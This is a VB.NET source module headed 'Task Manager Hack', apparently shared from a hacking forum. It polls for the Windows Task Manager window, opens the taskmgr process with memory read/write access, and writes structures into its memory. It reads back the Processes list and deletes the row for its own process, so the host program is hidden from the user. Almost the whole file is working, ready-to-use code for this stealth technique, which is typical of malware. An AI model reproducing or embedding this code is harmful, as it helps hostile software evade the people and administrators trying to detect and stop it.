'|-|  Task Manager Hack   |-|
'############################
'#  Coded by Scout/Thyonic  #
'#Credits to: HacK-BacKTracK#
'#هههه امزح لحقوق لــِ        #
'#   This guy named jo0l    #
'#--------------------------#
'#           Use:           #
'# TMListViewDelete.Running #
'# Set it to true to start  #
'# Set it to false to stop  #
'# Don't mess with anything #
'#     or it may break.     #
'############################
#Region " Imports "
Imports System.IO
Imports Microsoft.Win32.SafeHandles
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.ComponentModel
#End Region
#Region " TMListViewDelete "

Module TMListViewDelete
#Region " Declarations/Functions/Consts "

    Private Const LVM_FIRST = &H1000
    Private Const LVM_DELETECOLUMN = LVM_FIRST + 28

    Private Const LVM_GETITEMCOUNT = (LVM_FIRST + 4)
    Private Const LVM_SORTITEMS = (LVM_FIRST + 48)
    Private Const LVM_DELETEITEM = (LVM_FIRST + 8)
    Private Const LVM_GETNEXTITEM = (LVM_FIRST + 12)
    Private Const LVM_GETITEM = (LVM_FIRST + 75)

    Private Delegate Function EnumDelegate(ByVal lngHwnd As IntPtr, ByVal lngLParam As Integer) As Integer
    Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal Hwnd As IntPtr, ByVal wMsg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    Private Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Function EnumChildWindows Lib "user32.dll" (ByVal hWndParent As IntPtr, ByVal lpEnumFunc As EnumDelegate, ByVal lParam As Integer) As Integer
    Declare Function GetClassName Lib "user32.dll" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
    Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hWnd As IntPtr, ByVal lpClassName As System.Text.StringBuilder, ByVal nMaxCount As Integer) As Integer
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As IntPtr) As Integer
    Dim t As New Timer

    Dim hwnd As IntPtr
    Dim controls As String
    Public MyProc As String

    Dim ProcLV As IntPtr = IntPtr.Zero
#End Region

#Region " Timer's Tick "
    Private Sub t_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs)
        If ProcLV = IntPtr.Zero Then
            hwnd = FindWindow(vbNullString, "Windows Task Manager")
            If hwnd <> 0 Then
                'Clipboard.SetText(hwnd)
                EnumChildWindows(hwnd, New EnumDelegate(AddressOf TMListViewDelete.EnumChildWindows), 0)
            End If
        Else
            GetListView(hwnd, ProcLV)
        End If
    End Sub
#End Region

#Region " Running Property "
    Public Property Running() As Boolean
        Get
            If t.Enabled = True Then
                Return True
            Else
                Return False
            End If
        End Get
        Set(ByVal value As Boolean)
            If value = True Then
                MyProc = Process.GetCurrentProcess.ProcessName
                If Not t.Interval = 50 Then
                    With t
                        AddHandler t.Tick, AddressOf t_Tick
                        .Interval = 50
                        .Enabled = True
                        .Start()
                    End With
                Else
                    t.Enabled = True
                    t.Start()
                End If
            Else
                t.Enabled = False
                t.Stop()
                ProcLV = IntPtr.Zero
            End If
        End Set
    End Property

#End Region

#Region " Getting ListViews"
    Private Function EnumChildWindows(ByVal lngHwnd As IntPtr, ByVal lngLParam As Integer) As Integer
        Dim strClassName As String = GetClass(lngHwnd)
        Dim strText As String = GetTitleText(lngHwnd)
        If InStr(strClassName.ToString, "SysListView32") Then
            'GetListView(hwnd, lngHwnd)
            If InStr(strText, "Processes") Then
                ProcLV = lngHwnd
            End If
        End If
        Dim Classes As String = lngHwnd.ToString & ", " & strClassName & ", " & strText
        Return 1
    End Function
    Private Function GetClass(ByVal handle As IntPtr) As String
        Dim strClassName As New System.Text.StringBuilder()
        strClassName.Length = 255
        GetClassName(handle, strClassName, strClassName.Length)
        Return strClassName.ToString
    End Function
    Private Function GetTitleText(ByVal handle As IntPtr) As String
        Dim titleText As New System.Text.StringBuilder()
        titleText.Length = GetWindowTextLength(handle) + 1
        GetWindowText(handle, titleText, titleText.Length)
        Return titleText.ToString
    End Function

#End Region
End Module

#End Region
#Region " Get Items "
Module GetItems
    Dim listViewHandle As IntPtr
#Region " Functions "
    <DllImport(kernel32, SetLastError:=True)> _
    Public Function OpenProcess( _
        ByVal dwDesiredAccess As UInteger, _
        ByVal bInheritHandle As Boolean, _
        ByVal dwProcessId As Integer) As SafeProcessHandle
    End Function


#Region " ReadProcessMemory "
    <DllImport(kernel32, EntryPoint:="ReadProcessMemory", SetLastError:=True, CharSet:=CharSet.Unicode)> _
    Public Function ReadProcessMemoryW( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByVal lpBuffer As StringBuilder, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True, CharSet:=CharSet.Ansi)> _
    Public Function ReadProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByVal lpBuffer As StringBuilder, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True)> _
    Public Function ReadProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByRef lpBuffer As LV_ITEM, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True)> _
    Public Function ReadProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByRef lpBuffer As HDITEM, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True)> _
    Public Function ReadProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByVal lpBuffer As IntPtr, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
#End Region

#Region " SendMessage "
    <DllImport(user32, SetLastError:=True)> _
    Public Function SendMessage( _
        ByVal hWnd As IntPtr, _
        ByVal message As UInteger, _
        ByVal wParam As IntPtr, _
        ByVal lParam As IntPtr) As Integer
    End Function

    ' Has a different return type, so can't overload.
    <DllImport(user32, SetLastError:=True, EntryPoint:="SendMessageA")> _
    Public Function GetHeaderSendMessage( _
        ByVal hWnd As IntPtr, _
        ByVal message As UInteger, _
        ByVal wParam As IntPtr, _
        ByVal lParam As IntPtr) As IntPtr
    End Function

    <DllImport(user32, SetLastError:=True)> _
    Public Function SendMessage( _
        ByVal hWnd As IntPtr, _
        ByVal message As UInteger, _
        ByVal wParam As Integer, _
        ByVal lParam As StringBuilder) As Integer
    End Function

    <DllImport(user32, SetLastError:=True)> _
    Public Function SendMessage( _
        ByVal hWnd As IntPtr, _
        ByVal message As UInteger, _
        ByVal wParam As Integer, _
        ByVal lParam As IntPtr) As Integer
    End Function
#End Region

#Region " VirtualAllocEx "
    <DllImport(kernel32, SetLastError:=True)> _
    Public Function VirtualAllocEx( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpAddress As IntPtr, _
        ByVal dwSize As Integer, _
        ByVal flAllocationType As UInteger, _
        ByVal flProtect As UInteger) As IntPtr
    End Function
#End Region

#Region " VirtualFreeEx "
    <DllImport(kernel32, SetLastError:=True)> _
    Public Function VirtualFreeEx( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpAddress As IntPtr, _
        ByVal dwSize As Integer, _
        ByVal dwFreeType As UInteger) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
#End Region

#Region " WriteProcessMemory "
    <DllImport(kernel32, SetLastError:=True)> _
    Public Function WriteProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByRef lpBuffer As LV_ITEM, _
        ByVal nSize As Integer, _
        ByRef lpNumberOfBytesWritten As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True)> _
    Public Function WriteProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByRef lpBuffer As HDITEM, _
        ByVal nSize As Integer, _
        ByRef lpNumberOfBytesWritten As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
#End Region
#End Region
#Region " Consts "
    Public Const LVM_FIRST As UInteger = &H1000
    Public Const LVM_DELETEITEM As UInteger = (LVM_FIRST + 8)

    Public Const kernel32 As String = "kernel32"
    Public Const user32 As String = "user32"
    Public Const LVM_GETITEMCOUNT As UInteger = &H1004
    Public Const LVM_GETITEMTEXT As UInteger = &H102D
    Public Const LVM_GETHEADER As UInteger = &H101F
    Public Const HDM_GETIEMA As UInteger = &H1203
    Public Const HDM_GETITEMW As UInteger = &H120B
    Public Const HDM_GETITEMCOUNT As UInteger = &H1200
    Public Const HDM_GETUNICODEFORMAT As UInteger = &H2006
    Public Const HDI_TEXT As UInteger = 2
    Public Const MEM_COMMIT As UInteger = &H1000
    Public Const MEM_RELEASE As UInteger = &H8000
    Public Const PAGE_READWRITE As UInteger = 4
    Public Const PROCESS_VM_READ As UInteger = &H10
    Public Const PROCESS_VM_WRITE As UInteger = &H20
    Public Const PROCESS_VM_OPERATION As UInteger = &H8
    Public Const WM_GETTEXT As UInteger = &HD
    Public Const WM_GETTEXTLENGTH As UInteger = &HE
#End Region
#Region " Structures "
#Region " LV_ITEM "
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
    Public Structure LV_ITEM
        Public mask As UInteger
        Public iItem As Integer
        Public iSubItem As Integer
        Public state As UInteger
        Public stateMask As UInteger
        Public pszText As IntPtr
        Public cchTextMax As Integer
        Public iImage As Integer
        Public lParam As IntPtr
        Public iIndent As Integer
        Public iGroupId As Integer
        Public cColumns As Integer
        Public puColumns As IntPtr
        Public piColFmt As IntPtr
        Public iGroup As Integer
        Public Function Size() As Integer
            Return Marshal.SizeOf(Me)
        End Function
    End Structure
#End Region

#Region " HDITEM "
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure HDITEM
        Public mask As UInteger
        Public cxy As Integer
        Public pszText As IntPtr
        Public hbm As IntPtr
        Public cchTextMax As Integer
        Public fmt As Integer
        Public lParam As IntPtr
        Public iImage As Integer
        Public iOrder As Integer
        Public Function Size() As Integer
            Return Marshal.SizeOf(Me)
        End Function
    End Structure
#End Region
#End Region
#Region "Get List View Items "
    Public Function GetListView(ByVal handle As IntPtr, ByVal lvhandle As IntPtr) As Boolean
        listViewHandle = lvhandle
        Dim hParent As IntPtr = handle

        Dim id As Integer = -1
        Try
            For Each p In Process.GetProcessesByName("taskmgr")
                If p.MainWindowTitle = "Windows Task Manager" Then
                    id = p.Id
                End If
            Next
            If id = -1 Then
                Throw New ArgumentException("Could not find the process specified", "processName")
            End If
        Catch : Return False : End Try

        Dim hprocess As SafeProcessHandle = Nothing
        Try
            hprocess = OpenProcess(PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, id)

            If hprocess Is Nothing Then
                If Marshal.GetLastWin32Error = 0 Then
                    Throw New System.ComponentModel.Win32Exception
                End If
            End If

            Dim itemCount As Integer = SendMessage(listViewHandle, LVM_GETITEMCOUNT, IntPtr.Zero, IntPtr.Zero)

            For row As Integer = 0 To itemCount - 1

                Dim lvi As New ListViewItem(GetItem(row, 0, hprocess))
                If lvi.Text.Contains(TMListViewDelete.MyProc) Then SendMessage(listViewHandle, LVM_DELETEITEM, row, IntPtr.Zero)
            Next
        Catch : Return False
        Finally
            If hprocess IsNot Nothing Then
                hprocess.Close()
                hprocess.Dispose()
            End If

        End Try
        Return True
    End Function
#End Region
#Region " SafeProcessHandle "
    Friend NotInheritable Class SafeProcessHandle
        Inherits SafeHandleZeroOrMinusOneIsInvalid
        Declare Auto Function CloseHandle Lib "kernel32.dll" (ByVal hObject As IntPtr) As Boolean

        Public Sub New()
            MyBase.New(True)
        End Sub

        Public Sub New(ByVal handle As IntPtr)
            MyBase.New(True)
            MyBase.SetHandle(handle)
        End Sub

        Protected Overrides Function ReleaseHandle() As Boolean
            Return CloseHandle(MyBase.handle)
        End Function

    End Class
#End Region
#Region " GetItem "
    Private Function GetItem(ByVal row As Integer, ByVal subitem As Integer, _
                                ByVal hProcess As SafeProcessHandle) As String

        Dim lvitem As New LV_ITEM
        lvitem.cchTextMax = 260
        lvitem.mask = 1
        lvitem.iItem = row
        lvitem.iSubItem = subitem
        Dim pString As IntPtr
        Dim s As New StringBuilder(260)
        Try

            pString = VirtualAllocEx(hProcess, IntPtr.Zero, 260, MEM_COMMIT, PAGE_READWRITE)
            lvitem.pszText = pString
            Dim pLvItem As IntPtr
            Try
                pLvItem = VirtualAllocEx(hProcess, IntPtr.Zero, lvitem.Size, MEM_COMMIT, PAGE_READWRITE)
                Dim boolResult As Boolean = WriteProcessMemory(hProcess, pLvItem, lvitem, lvitem.Size, 0)
                If boolResult = False Then Throw New Win32Exception

                SendMessage(listViewHandle, LVM_GETITEMTEXT, row, pLvItem)
                boolResult = ReadProcessMemory(hProcess, pString, s, 260, 0)
                If boolResult = False Then Throw New Win32Exception
                boolResult = ReadProcessMemory(hProcess, pLvItem, lvitem, Marshal.SizeOf(lvitem), 0)
                If boolResult = False Then Throw New Win32Exception
            Finally
                If pLvItem.Equals(IntPtr.Zero) = False Then
                    Dim freeResult As Boolean = VirtualFreeEx(hProcess, pLvItem, 0, MEM_RELEASE)
                    If freeResult = False Then Throw New Win32Exception
                End If
            End Try
        Finally
            If pString.Equals(IntPtr.Zero) = False Then
                Dim freeResult As Boolean = VirtualFreeEx(hProcess, pString, 0, MEM_RELEASE)
                If freeResult = False Then Throw New Win32Exception
            End If
        End Try

        Return s.ToString
    End Function
#End Region
End Module

#End Region